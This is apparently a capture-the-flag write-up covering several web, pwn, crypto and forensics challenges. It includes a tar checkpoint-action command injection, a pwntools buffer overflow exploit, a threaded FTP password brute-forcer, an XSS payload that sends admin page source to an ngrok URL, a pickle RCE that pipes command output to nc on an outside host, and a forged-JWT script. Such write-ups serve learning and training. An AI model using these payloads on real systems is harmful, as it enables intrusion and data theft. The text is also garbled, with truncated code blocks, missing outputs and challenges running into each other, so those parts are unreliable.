## tartarsausage {#tartarsausage}
{% highlight bash %}
Find the sausage and be a king of "tar".

Flag format: CTF{sha256}
{% endhighlight %}

Accessing the URL provided on the platform returned a rather basic webpage:

<div>
<center><img src="/images/unbreakable-2-writeup/tartarsausage-1.png"></center>
</div>

You might think that solving this challenge involves playing around with the upload functionality, but it doesn't. The source code of the index page revealed a 'secret' page:

<div>
<center><img src="/images/unbreakable-2-writeup/tartarsausage-2.png"></center>
</div>

<div>
<center><img src="/images/unbreakable-2-writeup/tartarsausage-3.png"></center>
</div>

The challenge mentioned tar multiple times and the new page mentioned something about shell commands "that won't succeed", so (after multiple attempts) I guessed that the PHP script that processes the data gives the inputed string as an argument to `tar` by using PHP's [escapeshellcmd](https://www.php.net/manual/en/function.escapeshellcmd.php) function. `escapeshellcmd` is known to be (kind of) vulnerable - it makes sure no other commands get executed, but it allows the input to consist of multiple switches. Also, [tar's GTFOBins page](https://gtfobins.github.io/gtfobins/tar/) suggests the program has some switches that would allow an attacker to execute arbitrary commands:

{% highlight bash %}
It can be used to break out from restricted environments by spawning an interactive system shell.
(a) tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
{% endhighlight %}

As I've already said, `escapeshellcmd` won't prevent the input string from providing multiple switches. The following payload helped me find the folder in which the flag could be found:

{% highlight bash %}
-cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="ls -lah"
{% endhighlight %}

<div>
<center><img src="/images/unbreakable-2-writeup/tartarsausage-4.png"></center>
</div>

The directory with a very long name contained a file named 'flag' that contained the flag.

## bof {#bof}
{% highlight bash %}
This is a basic buffer overflow.

Flag format: CTF{sha256}
{% endhighlight %}

As the description said, this was a basic buffer overflow. I've explained [buffer](http://localhost:4000/rop-with-one-gadget/) [overflow](http://localhost:4000/rop-simple/) vulnerabilities before, so I'll quickly go through the solution without an emphasis on details. The first step was to identify the input that could cause a buffer overflow. This was pretty simple, as the binary only accepted one input:

{% highlight bash %}
yakuhito@furry-catstation:~/ctf/unr2/bof$ ./bof
Please enter the flag: 
ctf{yakuhito}
yakuhito@furry-catstation:~/ctf/unr2/bof$ python -c 'print("A" * 1024)' | ./bof
Please enter the flag: 
Segmentation fault
yakuhito@furry-catstation:~/ctf/unr2/bof$ checksec ./bof

    NX:       NX disabled
    PIE:      No PIE
yakuhito@furry-catstation:~/ctf/unr2/bof$
{% endhighlight %}

The next step is to find the offset of the part of the input that overrides the buffer:

{% highlight bash %}
yakuhito@furry-catstation:~/ctf/unr2/bof$ python -c "from pwn import *; print(cyclic(1024, n=8))"

The program crashed because a return statement tried to redirect execution to a non-existent address (0x626161616161616f). `pwnlib` as another helpful function that can help determine the offset of a substring in a string generated by `cyclic`: `cyclic_find`

{% endhighlight %}

Another useful thing to note is that the binary contains a function called `win` that should print out the flag:

{% highlight bash %}
gdb-peda$ disassemble flag
Dump of assembler code for function flag:

   0x0000000000400768 <+1>:	mov    rbp,rsp
{% endhighlight %}

The info collected above is enough to create an exploit:

{% highlight python %}
from pwn import *

#r = remote("35.242.253.155", 30339)
r = process("./bof")

win_func = 0x400767

payload = b""
payload += b"A" * 312
payload += p64(win_func)

r.sendline(payload)
r.interactive()
{% endhighlight %}
{% highlight bash %}
yakuhito@furry-catstation:~/ctf/unr2/bof$ python exploit.py

yakuhito@furry-catstation:~/ctf/unr2/bof$
{% endhighlight %}

Even though this exploit worked on my computer, it didn't succeed on the target. The reason was simple: a stack alignment issue. Some functions require the stack to be aligned - thankfully it is really easy to align it. In this case, all I needed was to call a `ret` before calling the `win` function. The address of one such `ret` instruction can be found in the gdb output above - 0x4007f6:

{% highlight python %}
from pwn import *

r = remote("35.242.253.155", 30339)
#r = process("./bof")

win_func = 0x400767
ret_gadget = 0x4007f6

payload = b""
payload += b"A" * 312
payload += p64(ret_gadget)
payload += p64(win_func)

r.sendline(payload)

{% endhighlight %}

Let's secure the network using some special routers. We need to decrypt this message first : 013032224029145C2047711D11562831021F077A1406782B28

Reversing does not rhyme with yakuhito, and for a good reason! I'm not very good at reversing challenges, but thankfully this one was pretty easy. I opened the given binary in IDA and found the function used to encrypt the string:

<div>
<center><img src="/images/unbreakable-2-writeup/mrrobot-1.png"></center>
</div>

It might look scary, but I assure you it isn't! `v11` holds the encrypted string - you can deduce that from L42. To end your suffering quicker, I'll tell you directly what the function does: it first chooses a random number from 0 to 15 that gets encoded as the first 2 characters of the resulting string. After that, it iterates over each letter of the plaintext, XORs it using the value chosen before and a vector of seemingly random characters and turns that to hex.

There are 3 distinct solutions that I can think off. I'm going to walk through each of them. The first it to reverse the XOR operation itself. To do that, you need the XOR key - it can wither be found in IDA bu clicking on `off_202010` or by running strings on the binary. Next, you can use python to XOR the given string and recover the original message:

{% highlight bash %}

The second method involves recognizing the 'algorithm' used to encrypt the password and use an online decoder. The ciphertext is actually a CISCO Router Password Hash and can be decrypted on [this site](https://www.ifm.net.nz/cookbooks/passwordcracker.html).

The last method is more like a black-box approach. If you  give different arguments to the function, you can see that each 2 characters from the input add two characters to the output. Knowing that, you could make a script that bruteforces the flag character by character. The output also depends on the output of that `rand() % 16`, but you could easily bypass that by just calling the function multiple times for every character and collecting all outputs.

No matter the method you've chosen to follow, the output is the same: `CTF{Br3ak_th3_Cisc0_B0x}`. However, the description mentions the flag is `ctf{decrypt_message(sha256)}`, so the real flag is `ctf{sha256('Br3ak_th3_Cisc0_B0x')}`

**Flag:** ctf{17ed97dbc53e4c9bf76a20a1721be46fae380c533bf4f9a2878e201fe9d8bee9}

# Sherlock's Mystery {#sherlocksmistery}
{% highlight bash %}
We are in big trouble…

The Money Bank of Spain got robbed… and the thieves managed to steal all the gold because a hacker cracked our protection systems.

He managed to steal our password. WE know that a local file was created on the target, containing the password.

Could you please help us?

Flag format: ctf{password}
{% endhighlight %}

I'm honestly not sure what to write about this challenge. I was given a file that seemed to contain a dump of commands someone ran on a computer. The only task was to find the password in all that output (pro tip: look at lines 216/221/222) and decode it from base64.

The given target site seems pretty basic:

However, navigating to the url given in the description returns an SQLAlchemy error:

SQLAlchemy is a python library used for interacting with SQL databases. Since the SQL injection seems so basic, I just used `sqlmap` to exploit it. The first command shoudl identify the injection point:

Volatility - what a wonderful tool! I was given a pretty large file named `admin.bin`, so I made the assumption that it was a memory dump. The first step was to determine the profile (the OS the image was taken from):

After determining the profile to be `Win7SP1x64`, I ran `cmdscan`, but there was no output. The next logical step was to search for files:

The flag was `ctf{sha256('flag')}` - I wouldn't be surprised if someone just guessed it.

**Flag:** ctf{807d0fbcae7c4b20518d4d85664f6820aafdf936104122c5073e7744c46c4b87}

This challenge was harder than the others, but not in the usual sense. I was given an IP address that hosted an FTP server. Thankfully, I could log in using the `anonymous` user:

{% highlight ctf %}

221 Goodbye.
yakuhito@furry-catstation:~/ctf/unr2/casualctf$ 
{% endhighlight %}

Most commands didn't work because the data connection was rejected. What that really meant is that the FTP server tried to connect back to one of your ports. If you had a firewall or were behind a router, well, that's the end for you. To bypass this, I used a VPS on DigitalOcean and got the only available file, `.info`, which read `your user is user`.

Since the description of the FTP server ('it might rock your world') made a reference to `rockyou.txt`, I thought about bruteforcing `user`'s password. After confirming that I can use bruteforce with an admin (always do that in a CTF), I wrote the following script to bruteforce `user`'s password:

{% highlight bash %}
from pwn import *
import sys
import threading

f = open("/pentest/rockyou.txt", "r")

def tryUser(psw):
	context.log_level = "CRITICAL"
	r = remote("35.234.65.24", 31653)

	r.recvuntil("world")
	r.sendline("USER user\x0d")
	r.recvuntil(b"password.\x0d\n")
	r.sendline("PASS " + psw + "\x0d\n")
	a = r.recvuntil("\n")
	r.close()
	return b"530 Authentication " not in a


password = f.readline().strip()
found = False
threads = 0

def tryPassword(psw):
	global threads, found
	threads += 1
	print('Trying password: ' + psw)
	if tryUser(psw):
		found = True
		print('Found password: ' + psw)
	threads -= 1


while password and not found:
	while threads >= 25:
		time.sleep(0.5)
	t = threading.Thread(target=tryPassword, args=(password,))
	t.start()
	password = f.readline().strip()
{% endhighlight %}

The script above finds `user`'s password - `sunshine`. Using those details, I logged in to my VPS again, connected to the FTP server as `user` and got the flag.

**Flag:** ctf{87ed2735b25a9ed6f02c28db6d4a7d86e7e71aa8bddda0df1fe73fa4a860d9cc}

# frameble {#frameble}

{% highlight bash %}
Just another OWASP Top 10 vulnerability.

Please note that the admin is live 24/7 to approve your posts.

Flag format: CTF{sha256}
{% endhighlight %}

This was a simple XSS challenge. After creating an account and signing in, I created a new post and put the following payload inside the 'body' field:

{% highlight javascript %}
<script>
var exfil = document.getElementsByTagName("body")[0].innerHTML;
window.location.href="https://c3d9707d386e.ngrok.io?pgsrc=" + btoa(exfil);
</script>
{% endhighlight %}

The payload above sent the source code of the page the admin used to view my post to an URL which tunnels the request back to my computer. The flag could be found in the source code of that page:

{% highlight bash %}

After opening the resulting pcap file in wireshark, I saw a lot of UDP packets. However, the traffic log also contained an HTTP POST request to `xor.pw`. Following the HTTP stream revealed the flag:

The given file was a 30-minute-long wav. I used [this site](https://morsecode.world/international/decoder/audio-decoder-adaptive.html) to decode the message: (yes, I muted the tab and waited 30 minutes because I couldn't find another tool that would work):

{% highlight bash %}
THE BATTLE OF THE BULGE, ALSO KNOWN AS THE ARDENNES COUNTEROFFENSIVE, WAS THE LAST MAJOR GERMAN OFFENSIVE CAMPAIGN ON THE WESTERN FRONT DURING WORLD WAR II, AND TOOK PLACE FROM 16 DECEMBER 1944 TO 25 JANUARY 1945. IT WAS LAUNCHED THROUGH THE DENSELY FORESTED ARDENNES REGION OF WALLONIA IN EASTERN BELGIUM, NORTHEAST FRANCE, AND LUXEMBOURG, TOWARDS THE END OF THE WAR IN EUROPE. THE OFFENSIVE WAS INTENDED TO STOP ALLIED USE OF THE BELGIAN PORT OF ANTWERP AND TO SPLIT THE ALLIED LINES, ALLOWING THE GERMANS TO ENCIRCLE AND DESTROY FOUR ALLIED ARMIES AND FORCE THE WESTERN ALLIES TO NEGOTIATE A PEACE TREATY IN THE AXIS POWERS\' FAVOR.

DURING THE LIBERATION OF FRANCE, THE EXTENSIVE NETWORK OF THE FRENCH RESISTANCE HAD PROVIDED VALUABLE INTELLIGENCE ABOUT GERMAN DISPOSITIONS. ONCE THEY REACHED THE GERMAN BORDER, THIS SOURCE DRIED UP. IN FRANCE, ORDERS HAD BEEN RELAYED WITHIN THE GERMAN ARMY USING RADIO MESSAGES ENCIPHERED BY THE ENIGMA MACHINE, AND THESE COULD BE PICKED UP AND DECRYPTED BY ALLIED CODE-BREAKERS HEADQUARTERED AT BLETCHLEY PARK, TO GIVE THE INTELLIGENCE KNOWN AS ULTRA. IN GERMANY SUCH ORDERS WERE TYPICALLY TRANSMITTED USING TELEPHONE AND TELEPRINTER, AND A SPECIAL RADIO SILENCE ORDER WAS IMPOSED ON ALL MATTERS CONCERNING THE UPCOMING OFFENSIVE. 42 THE MAJOR CRACKDOWN IN THE WEHRMACHT AFTER THE 20 JULY PLOT TO ASSASSINATE HITLER RESULTED IN MUCH TIGHTER SECURITY LRX09BF1W3QUKJP52M4ZDCHOSYIE6VG8NAT7 AND FEWER LEAKS.

KAMPFGRUPPE PEIPER, AT THE HEAD OF SEPP DIETRICH\'S SIXTH PANZER ARMY, HAD BEEN DESIGNATED TO TAKE THE LOSHEIM-LOSHEIMERGRABEN ROAD, A KEY2: SECONDWORLDWAR ROUTE THROUGH THE LOSHEIM GAP, BUT IT WAS CLOSED BY TWO COLLAPSED OVERPASSES THAT GERMAN ENGINEERS FAILED TO REPAIR DURING THE FIRST DAY.

The text contained 3 strange sequences:

{%highlight bash %}
1. XXGVXVVVXDVAAFGXFGGXXAGXFVGGAAFAAVVADDVGDGGGVAAAGGXDFXXVDXXVVAVGGAGGXVVAVVGAVGFVVDVV
2. LRX09BF1W3QUKJP52M4ZDCHOSYIE6VG8NAT7
3. KEY2: SECONDWORLDWAR
{% endhighlight %}

After a bit of thinking, I conclued that the 1st string should be the ciphertext, the 2nd is an alphabet and the 3rd contains the key required to decrypt the cybertext. The cybertext contained only 6 letters, so I quickly discovered that the encryption algorithm was most likely the [ADFGVX cipher](https://en.wikipedia.org/wiki/ADFGVX_cipher). I used [this tool](https://cryptii.com/pipes/adfgvx-cipher) to decrypt the final message:

<div>
<center><img src="/images/unbreakable-2-writeup/warplan-flag.png"></center>
</div>

For some reason cryptii only decrypted the cyphertext if it was lowercase. The flag is `ctf{sha256('defendthewestgateofthefortresswithallcosts')}`

**Flag:** ctf{70cca323b9e0af74985285521f5751106a34f5c0b534e3f14c24c8fca027d9fc}

# alfa-cookie {#alfacookie}
{% highlight bash %}
If you are the real admin, why you keep trying?

Flag format: CTF{sha256}
{% endhighlight %}

The site given as a target contained a simple webpage:

<div>
<center><img src="/images/unbreakable-2-writeup/alfacookie-page.png"></center>
</div>

Clicking on the 'Dashboard' link returned a page that read 'Try Harder!'. Upon further inspection, I discovered two cookies that were set:

{% highlight bash %}
auth_cookie: 6531267450116e20212427513639235b59144627613e621540412121103931613e366b
key: MUVDZBIPDVJ8EJJ473LWP41252DS73AS4EE
{% endhighlight %}

The `auth_cookie` cookie looked like a hex-encoded string, but when I tried to decode it I got a string that didn't make any sense. After thinking about the challenge for a bit, I tried XOR-ing the strange value I got with the `key` cookie and I found something interesting:

{% highlight bash %}
yakuhito@furry-catstation:~/ctf/unr2/alfacookie$ python

>>> xor(_, key)
b"(dp0\nS'permission'\np1\nS'user'\np2\ns."
>>>
{% endhighlight %}

In case you don't recognize the output, it's an object encoded with pickle:

{% highlight bash %}
>>> import pickle
>>> pickle.loads(b"(dp0\nS'permission'\np1\nS'user'\np2\ns.")
{'permission': 'user'}
>>>
{% endhighlight %}

I could have theoretically changed the value of 'permission' from 'user' to 'admin', but that's just not how my mind works. Since `pickle` is vulnerable to RCE, I wanted to get command execution. The final exploit can be found below.

{% highlight python %}
import requests
import pickle
from pwn import *

url = "http://34.89.241.255:31110/dashboard"

class RCE:
    def __reduce__(self):
        cmd = ('ls -lah | nc 0.tcp.ngrok.io 16587')
        return os.system, (cmd,)


payload = pickle.dumps(RCE(), protocol=2)
print(payload)
key = len(payload) * "A"
auth_cookie = xor(payload, key).hex()

r = requests.get(url, cookies={"key": key, "auth_cookie": auth_cookie})

#print(r.text)
{% endhighlight %}

The output of the command executed remotely:

{% highlight bash %}

## under-construction {#underconstruction}
{% highlight bash %}
Found this web application that is still under construction.. I'm sure it's vulnerable because of that. Can you find it?

Flag format: CTF{sha256}
{% endhighlight %}

The given website looked, uhh, under construction:

<div>
<center><img src="/images/unbreakable-2-writeup/underconstruction-page.png"></center>
</div>

After signing up, there was little things that I could do, so I started analyzing the source code of the current page. The first thing that I noticed was that the app was created in Vue.js, which meant two things:
* the js files are 'compressed', but the source coude might be found in their respective .map files
* the data is most probably stored in `localStorage`, as opposed to cookies

By looking into `/js/app.d875ddd5.js.map`, I found out that admins have a role named `ROLE_ADMIN`. Also, the localStorage object contained an item named `user`:

{% highlight bash %}
localStorage.getItem("user")
"{\"id\":4,\"username\":\"yakuhito\",\"email\":\"[redacted]\",\"roles\":[\"USER\"],\"accessToken\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwiaWF0IjoxNjA4MTQ3MjE1LCJleHAiOjE2MDgyMzM2MTV9.nnnWOMdh1YzlAb1QRCRbXGVuBSFqrso_CUoQQ136EGk\"}"
{% endhighlight %}

I dicovered the admin panel by adding `ROLE_ADMIN` to the "roles" attribute. The app simply made a request to `/api/app/admin`. As the only supplied data was the JWT token, I knew I neede to forge a new one in order to solve the challenge.

I tried multiple attacks, but only one suceeded: bruteforcing the key. You can do that by using [jwt2john](https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py) and then using john on the resulting file. In this case, the key was 'letmein'. The final exploit forges a JWT token and makes a request to the admin endpoint:

{% highlight python %}
import requests
import jwt

url = "http://34.89.250.23:32372/api/app/admin"

payload = {"id":1, "iat":1608020118, "exp":1609106518}
token = jwt.encode(payload, "letmein", algorithm='HS256')

print(token)
r = requests.get(url, headers={"x-access-token": token})

print(r.text)
{% endhighlight %}

Running the script above gave me the flag:

{% highlight bash %}
yakuhito@furry-catstation:~/ctf/unr2/underconstruction$ python solve.py

## Closing Thoughts (totally not copied from my writeup for UNbreakable #1)

I honestly have no idea what you're doing here. Really. The writeup ended few lines before. However, since you're already here, I can't end this post without ~~bragging that I've solved all the challenges~~ publishing a part of the scoreboard and congratulating everyone that participated in the contest.
